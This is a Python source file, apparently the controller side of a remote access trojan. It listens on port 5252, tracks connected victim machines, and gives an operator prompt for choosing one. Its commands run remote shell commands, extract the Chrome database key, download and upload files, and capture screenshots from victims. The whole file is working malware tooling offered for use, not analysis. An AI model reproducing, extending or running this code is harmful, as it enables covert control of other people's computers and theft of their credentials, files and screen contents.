import socket
import os
# import sys
import time
import threading
from queue import Queue


number_of_thread = 2
job_number = [1, 2]
queue = Queue()
all_connection = []
all_address = []


def connection():
	global s
	s = socket.socket()
	s.bind(('', 5252))
	s.listen(5)
	print('[+] Binding the port [+]')


def accepting_connection():
	for conn in all_connection:
		conn.close()
	del all_connection[:]
	del all_address[:]
	while True:
		try:
			# global c
			c, a = s.accept()
			s.setblocking(1)
			all_connection.append(c)
			all_address.append(a)
			print('[+] We are connected to IP ' + a[0] + ' PORT ' + str(a[1]) + ' [+]')
		except:
			print('[-] Connection accecpting error [-]')


def start_i_shell():
	while True:
		i_shell = str(input('Hacsec>'))
		if i_shell == 'list':
			list_connections()
		elif 'select' in i_shell:
			c = get_target(i_shell)
			if c is not None:
				sendcommands(c)
		else:
			print('[+] Invaild command [+]')


def list_connections():
	results = ''
	for i, c in enumerate(all_connection):
		try:
			c.send(str.encode(' '))
			# time.sleep(1)
			c.recv(202480)
		except:
			del all_connection[i]
			del all_address[i]
			continue
		results = str(i) + '    ' + str(all_address[i][0]) + '    ' + str(all_address[i][1]) + '\n'

		print('------ ROXANAs ------' + '\n' + results)


def get_target(i_shell):
	try:
		target = i_shell.replace('select ', '')
		target = int(target)
		c = all_connection[target]
		print('[+] You are now connected to ' + str(all_address[target][0]))
		print(str(all_address[target][0]) + '>', end='')
		return c
	except:
		print('[-] Invalid selection')
		return None


def cmdcontroller(c):
	while True:
		# c.send(str.encode('readycmd'))
		global shellCMD
		shellCMD = str(input('>> '))
		if shellCMD == 'back':
			print('[+] Quiting the shellCMD [+]')
			c.send(str.encode('back'))
			sendcommands(c)
		elif (str.encode(shellCMD)) != 'back':
			c.send(str.encode(shellCMD))
			data = c.recv(10024).decode('utf-8')
			print(data, end='')
		elif len(shellCMD) == 0:
			cmdcontroller(c)


def shellcontroller(c):
	while True:
		# c.send(str.encode('readyhope'))
		shell = str(input('>>>'))
		if shell == 'back':
			print('[+] Quiting the HOPEshell [+]')
			c.send(str.encode('back'))
			sendcommands(c)
		elif shell == 'chromedbkey':
			c.send(str.encode('chromedbkey'))
			time.sleep(2)
			key = c.recv(90024).decode()
			if key == 'unable':
				print('[-] Try another way to get the keys [-]')
			else:
				print('[+] The key of chrome database has leacked successfully!!')
				print('[+] Hacking Successfull' + '\n')
				# time.sleep(2)
				print(key)
		elif shell[:7] == 'import ':
			# c.send(str.encode('import'))
			c.send(str.encode('import'))
			filename = str(shell[7:])
			c.send(str.encode(filename))
			byte = c.recv(1024)
			fbyte = open(filename, 'wb')
			fbyte.write(byte)
			fbyte.close()
			print('[+] File Downloaded sucessfully!! [+]')
		elif shell[:7] == 'export ':
			c.send(str.encode('export'))
			fpath = str(shell[7:])
			c.send(str.encode(fpath))
			listdir = str(os.listdir(os.getcwd()))
			print('[+] Which file want to upload [+] ' + '\n' + listdir)
			os.getcwd()
			fname = str(input('[+] '))
			c.send(str.encode(fname))
			filebyte = open(fname, 'rb')
			sbyte = filebyte.read(1024)
			c.send(sbyte)
			print('[+] File Uploaded sucessfully!! [+]')
		elif shell[:11] == 'screenshot ':
			c.send(str.encode('screenshot'))
			screenshot_name = str(shell[11:])
			# screenhot_byte = c.recv(1024)
			# time.sleep(1)
			ssbyte = open(screenshot_name, 'wb')
			while True:
				screenhot_byte = c.recv(1024)
				while screenhot_byte:
					ssbyte.write(screenhot_byte)
					screenhot_byte = c.recv(1024)
				ssbyte.close()
				break
			print('[+] Screenshot taken from ROXANA [+]')


def sendcommands(c):
	while True:
		try:
			print('\n' + '/+/ Make your deceition /+/')
			print('[+] shellCMD ' + '\n' + '[+] shell' + '\n' + '[+] back')
			platfrom = str(input('[+] Which you want to play with [+] '))
			if platfrom == 'shellcmd':
				c.send(str.encode('readycmd'))
				cmdcontroller(c)
			elif platfrom == 'shell':
				c.send(str.encode('readyhope'))
				shellcontroller(c)
			elif platfrom == 'back':
				break
		except:
			print('[-] Recatureing......')
			# accepting_connection()
			break


def create_workers():
	for _ in range(number_of_thread):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()


def work():
	while True:
		x = queue.get()
		if x == 1:
			connection()
			accepting_connection()
		if x == 2:
			start_i_shell()

		queue.task_done()


def create_jobs():
	for x in job_number:
		queue.put(x)

	queue.join()


create_workers()
create_jobs()


# if __name__ == '__main__':
	# accepting_connection()
